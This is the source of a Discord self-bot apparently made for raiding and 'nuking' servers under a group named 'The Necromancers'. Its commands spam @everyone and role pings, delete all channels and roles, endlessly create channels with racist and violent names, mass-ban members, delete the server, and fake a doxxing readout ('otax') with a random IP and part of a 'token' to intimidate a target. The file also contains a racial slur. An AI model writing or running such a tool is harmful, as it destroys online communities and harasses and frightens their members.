# Import
import discord
from discord.ext import commands
import sys
import os
from colorama import Fore as C
import random
import asyncio
import time
import json
import threading
from threading import Thread
from asyncio import tasks
import requests as rq
import base64
from tasksio import TaskPool
import aiohttp
import httpx
from pypresence import Presence

# ────── Intents ────── #

token = "" # token here
prefix = "^"

theo = commands.Bot(command_prefix=prefix,self_bot=True,help_command=None)

# Startup
@theo.event
async def on_connect():
    os.system('cls')
    print(f"""
{C.LIGHTRED_EX}    
███╗░░██╗███████╗░█████╗░██████╗░░█████╗░███╗░░░███╗░█████╗░███╗░░██╗░█████╗░███████╗██████╗░░██████╗
████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝██╔══██╗██╔════╝
██╔██╗██║█████╗░░██║░░╚═╝██████╔╝██║░░██║██╔████╔██║███████║██╔██╗██║██║░░╚═╝█████╗░░██████╔╝╚█████╗░
██║╚████║██╔══╝░░██║░░██╗██╔══██╗██║░░██║██║╚██╔╝██║██╔══██║██║╚████║██║░░██╗██╔══╝░░██╔══██╗░╚═══██╗
██║░╚███║███████╗╚█████╔╝██║░░██║╚█████╔╝██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝███████╗██║░░██║██████╔╝
╚═╝░░╚══╝╚══════╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝╚═╝░░╚═╝╚═════╝░

{C.WHITE}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯

{C.LIGHTRED_EX}  Client: {C.WHITE}{theo.user.name}#{theo.user.discriminator}
{C.LIGHTRED_EX}  Prefix: {C.WHITE}{prefix}
{C.LIGHTRED_EX}  Guilds: {C.WHITE}{len(theo.guilds)}  
{C.LIGHTRED_EX}  Friends: {C.WHITE}{len(theo.user.relationships)}
{C.LIGHTRED_EX}  Ping: {C.WHITE}{round(theo.latency * 1000)}ms

{C.WHITE}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
""")     

# ────── Customization ────── #

# Presence
@theo.event
async def on_ready():
    await theo.change_presence(activity=discord.Streaming(name="fail", url="https://www.twitch.tv/"))

# Errors
@theo.event 
async def on_command_error(ctx, error):
    print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}{error}")
    if isinstance(error, commands.CommandNotFound):
        print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}Command does not exist")
    if isinstance(error, commands.MissingRequiredArgument):
        print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}Missing required args")
    if isinstance(error, commands.MissingPermissions):
        print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}You don't have enough permissions to use this command")  

# ────── Theo Specials ────── #

# Raid
@theo.command(aliases=['reid','rayd','reyd','r@1d'])
async def raid(ctx):
  await ctx.message.delete()
  count = 0
  roles = []
  for role in ctx.guild.roles:
    if role.name == '@everyone':
      pass
    else:
      roles.append(f'<@&{role.id}>')
  for i in range(20):
    await ctx.send('''```diff
-- [ SERVER SEIZED BY THE NECROMANCERS / THE CONJURANCY ] --
```
@everyone
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟
https://media.discordapp.net/attachments/1027184082829971457/1031654232601923694/the_necromancers.png
discord.gg/76GAMfH4hk
''' 
+ f''.join([random.choice(roles) for i in range(15)]))
    await ctx.send('''```diff
-- [ SERVER SEIZED BY THE NECROMANCERS / THE CONJURANCY ] --
```
@everyone
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟
https://media.discordapp.net/attachments/1027184082829971457/1031654232601923694/the_necromancers.png
discord.gg/76GAMfH4hk
''' 
+ f' '.join([random.choice(roles) for i in range(15)]))  

# Jakman Solos
@theo.command()
async def jaksolos(ctx):
    await ctx.message.delete()
    while 1==1:
        print(f"{C.LIGHTYELLOW_EX}JAKMAN SOLOS")


# ────── Help Commands ────── #

# Help
@theo.command()
async def cmd(ctx):
    await ctx.message.delete()
    await ctx.send(f"""
https://i8.ae/xTpXS
""", delete_after=15)

# ────── Utility ────── #

# Spam 
@theo.command()
async def spam(ctx, amount,*,msg):
  await ctx.message.delete()
  for i in range(int(amount)):
    await ctx.send(msg)

# Server Info
@theo.command()
async def serverinfo(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    await ctx.send(f"""```diff
-- [ {guild.name} ] --

★ Server Name:            »  {ctx.guild.name}
★ Server Description:     »  {ctx.guild.description}
★ Server Region:          »  {ctx.guild.region}
★ Server Owner:           »  {ctx.guild.owner}
★ Server Members:         »  {ctx.guild.member_count}
```
{guild.icon_url}
""")

# User Info
@theo.command(aliases=['whois'])
async def userinfo(ctx, member : discord.Member):
  await ctx.message.delete()
  for role in member.roles:
    role.mention
    if role.name == '@everyone':
      pass
  await ctx.send(f"""```diff
-- [ {member.display_name} ] --

★ User ID:      »  {member.id}
★ Created at:   »  {member.joined_at}
★ Joined at:    »  {member.display_name}
★ Roles:        »   
```{" ".join([role.mention for role in member.roles])}

{member.avatar_url}
""")

# Ping
@theo.command()
async def ping(ctx):
  await ctx.message.delete()
  await ctx.send(f"`Ping is {round(theo.latency * 1000)}ms`")
    
# Purge
@theo.command(aliases=['purg'])
async def purge(ctx, messages: int = None):
    await ctx.message.delete()
    if messages == None:
        messages = 800
    async for message in ctx.message.channel.history(limit=messages).filter(
            lambda m: m.author == theo.user).map(lambda m: m):
        try:
            await message.delete()
        except Exception as e:
            print("Skill issues purging ig")

# Clear
@theo.command()
async def clear(ctx):
  await ctx.message.delete()
  x = await ctx.channel.clone(reason="Has been nuked")
  await ctx.channel.delete()
  await x.send("""
```diff
-- [ CHANNEL HAS BEEN CLEARED ] --
```""")            

# Avatar
@theo.command(aliases=['av'])
async def avatar(ctx, user: discord.User = None):
    await ctx.message.delete()
    if user == None:
        user = ctx.message.author
    await ctx.send(user.avatar_url)             

# ────── Backup ────── #    

# Loadtemp
@theo.command()
async def loadtemp(ctx, template):
    if template == None:
        if imag:
            await ctx.send("""
:warning: Invalid template ! :warning:
**Please pick from the templates below:**
```diff
-- [ TEMPLATES ] --

---+ NA +---
```
      """)
        else:
            await ctx.send(":warning: Invalid template! :warning:")  
    if template == "NA":    
        print(f"{C.WHITE}Template is currently loading! {C.RESET}")    
        try:
            with open('seized.png', 'rb') as f:
                icon = f.read()
                await ctx.guild.edit(name='ཌNΛད -- ꜱᴇʀᴠᴇʀ ᴛᴇᴍᴘʟᴀᴛᴇ', icon=icon)
        except:
            pass    
    for c in ctx.guild.channels:
        await c.delete()
    try:
        verify = await ctx.guild.create_voice_channel(f"ᴅᴍ ᴀɴ ᴀᴅᴍɪɴ", category=None)          
        imp = await ctx.guild.create_category("🔴 𝗜𝗠𝗣𝗢𝗥𝗧𝗔𝗡𝗧")
        await ctx.guild.create_text_channel(f"ʀᴇɢᴜʟᴀᴛɪᴏɴꜱ", category=imp)
        await ctx.guild.create_text_channel(f"ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛꜱ", category=imp)
        await ctx.guild.create_text_channel(f"ɢʀᴀᴅᴇꜱ", category=imp)
        com = await ctx.guild.create_category("🔴 𝗧𝗘𝗫𝗧𝗨𝗔𝗟")
        await ctx.guild.create_text_channel(f"ᴄʜᴀᴛ", category=com)
        await ctx.guild.create_text_channel(f"ᴍᴇᴍᴇꜱ", category=com)
        await ctx.guild.create_text_channel(f"ᴍᴀᴛᴛᴇᴏ-jumpscarr-ᴄʜᴜʀᴄʜ", category=com)   
        vow = await ctx.guild.create_category("🔴 𝗩𝗢𝗪𝗘𝗟")
        await ctx.guild.create_voice_channel(f"ᴠᴏɪᴄᴇ ᴄʜᴀᴛ", category=vow)
        await ctx.guild.create_voice_channel(f"ɢᴀᴍɪɴɢ ᴠᴄ", category=vow)
        await ctx.guild.create_voice_channel(f"ᴍᴜꜱɪᴄ ᴠᴄ", category=vow)        
        hc = await ctx.guild.create_category("🔴 𝗦𝗧𝗔𝗙𝗙")
        await ctx.guild.create_text_channel(f"ᴇɴᴛʀɪᴇꜱ", category=hc)
        await ctx.guild.create_text_channel(f"ᴘʀɪᴠᴀᴛᴇ", category=hc)       
    except:
        pass

# Cserver
@theo.command()
async def cserver(ctx):                              # Made by KristanP
    await ctx.message.delete() 
    wow = await theo.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in theo.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(chann.name, overwrites=chann.overwrites, topic=chann.topic, slowmode_delay=chann.slowmode_delay, nsfw=chann.nsfw, position=chann.position)
            print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"{C.LIGHTBLUE_EX}Created new role : {C.WHITE}{role.name}")
            except:
                break       

# ────── Destruction ────── #  

# Otax
@theo.command()
async def otax(ctx, member : discord.Member):
    await ctx.message.delete()
    progress = [
     "1% - [##                         ]",
     "3% - [###                        ]",
     "6% - [####                       ]",
     "9% - [#####                      ]",
     "12% -[######                     ]",
     "15% -[#######                    ]",
     "20% -[########                   ]",
     "24% -[#########                  ]",
     "29% -[##########                 ]",
     "36% -[###########                ]",
     "41% -[############               ]",
     "46% -[#############              ]",
     "50% -[##############             ]",
     "56% -[###############            ]",
     "64% -[################           ]",
     "69% -[#################          ]",
     "71% -[##################         ]",
     "74% -[###################        ]",
     "79% -[####################       ]",
     "82% -[#####################      ]",
     "86% -[######################     ]",
     "89% -[#######################    ]",
     "93% -[########################   ]",
     "98% -[########################## ]",
     "100% -[##########################]",]
    kkk = await ctx.send(f"```ini\n[ Otaxxing User! ]\n```")
    bar = await ctx.send("```ini\n0% - [#                              ]\n```")
    for loads in progress:
        await bar.edit(content=f"""
```ini
[{loads}]
```
""")
    await kkk.delete()
    await bar.delete()
    IP1 = random.randint(0, 255)
    IP2 = random.randint(0, 255)
    IP3 = random.randint(0, 255)
    IP4 = random.randint(0, 255)
    sample_string = str(member.id)
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    try:
        await ctx.send(f"""
```ini
-- [ THE NECROMANCERS OTAX -- BUILT BY THEO ] --

★ Username             »  {member.display_name}
★ User ID              »  {member.id}
★ Created at:          »  {member.joined_at}
★ IPv4:                »  {IP1}.{IP2}.{IP3}.{IP4}
★ 1st Half of Token    »  {base64_string}
★ Avatar               »
```
{member.avatar_url}
""")
    except:
        print(f"\n%sSomething went wrong, you got kicked from the guild or either the user blocked you, here's your argument {ID} in case you wanna Toxx him.%s" % (red(), reset()))

# Change
@theo.command()
async def change(ctx):
    with open('seized.png', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='ཌNΛད Nuked by the Necromancers', icon=icon) 

channels = ["heil-theo", "oopsie-fingers-slipped", "kaboomed-by-na", "surrender", "get-sexed", "go-crying", "die-niggers", "ex-ae-blood-runs-in-my-veins"]
# MCH
@theo.command()
async def MCH(ctx):
    while True:
        guild = ctx.guild
        await guild.create_text_channel(random.choice(channels))    

# Cdel
@theo.command()
async def cdel(ctx):
    await ctx.message.delete()
    guild = ctx.guild 
    try:
        for channel in ctx.guild.channels:
            await channel.delete()
    except:
        print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}Cdel didn't work!")        

# Roledel
@theo.command()
async def roledel(ctx):
    for roles in list(ctx.guild.roles):
        try:
            await roles.delete()
        except:
            pass   

# Rolenuke
@theo.command()
async def rolenuke(ctx):
    for x in range(60):
        try:
            await ctx.guild.create_role(name="Necromancers for life")
            print(f"{C.WHITE}{x} {C.LIGHTBLUE_EX}Roles created.")
        except:
            pass   

# Massban
@theo.command()
async def massban(ctx):
    r = rq.put(f"https://discord.com/api/v9/guilds/bans/")
    res = r.json()
    for member in list(ctx.guild.members):
        await member.ban()

# Webhookspam
#@theo.event
#async def on_guild_channel_create(channel):
#    webhook = await channel.create_webhook(name="NUKED BY THEO")
#    try:
#        while True:
#            await webhook.send("""
#```diff
#-- [ SERVER SEIZED BY THE NECROMANCERS / THE CONJURANCY ] --
#```
#@everyone
#⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
#⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
#⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
#⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
#⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
#⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟
#https://media.discordapp.net/attachments/1027184082829971457/1031654232601923694/the_necromancers.png
#discord.gg/76GAMfH4hk
#""")
#    except:
#        pass

# Nuke                                         
@theo.command()
async def nuke(ctx):
  await ctx.message.delete()
  global raid
  raid = True
  await ctx.guild.edit(name='ཌNΛད Nuked by the Necromancers') 
  tasks = [change(ctx), cdel(ctx), MCH(ctx), roledel(ctx), rolenuke(ctx)]
  asyncio.gather(*tasks)  
  nukeresults()

# Nuke Results
@theo.command()
async def nukeresults(ctx):
    await ctx.message.delete()
    print(f"{C.LIGHTGREEN_EX} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ {C.GREEN}97.6/97.6 KB {C.LIGHTRED_EX}328.3 kB/s {C.WHITE}eta {C.LIGHTBLUE_EX}0:00:00{C.RESET}")
    print(f"> Nuke results:\n{len(ctx.guild.channels)} channels\n{len(ctx.guild.roles)} roles\n")

# Delserv
@theo.command(aliases=['deleteserver', 'delserver'])
async def delserv(ctx):
  await ctx.message.delete()
  await ctx.guild.delete() 

# Prune  
@theo.command()
async def prune(ctx):
    await ctx.message.delete()
    try:
        with open('seized.png', 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(icon=icon)
    except:
        pass        
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.guild.edit(name='ཌNΛད Nuked by the Necromancers') 
    await ctx.guild.create_text_channel("ʀᴀᴘᴇᴅ-ʙʏ-ɴᴇᴄʀᴏᴍᴀɴᴄᴇʀꜱ", category=None, limit="1")
    async def on_channel_create(channel):
        webhook = await channel.create_webhook(name="SUFFER")
        try:
            while True:
                await webhook.send("""    

```diff
-- [ SERVER COLONIZED BY THE NECROMANCERS / THE CONJURANCY ] --
```
https://media.discordapp.net/attachments/1036165470878973962/1042008448449122314/the_necromancers.png
""", limit='1', channel=channel)
        except:
            print(f"{C.LIGHTRED_EX}[ ERROR ] {C.WHITE}Something went wrong with pruning!")

# ────── Run ────── #

# Run
try:
  theo.run(token, bot = False)
except discord.LoginFailure:
  print(f"{C.RED}[ ERROR ] {C.WHITE}Client failed to log in.\n{C.RED}[ Invalid token ]")
except discord.HTTPException:
  print(f"{C.RED}[ ERROR ] {C.WHITE}Client failed to log in.\n{C.RED}[ Unknown Error ]")  
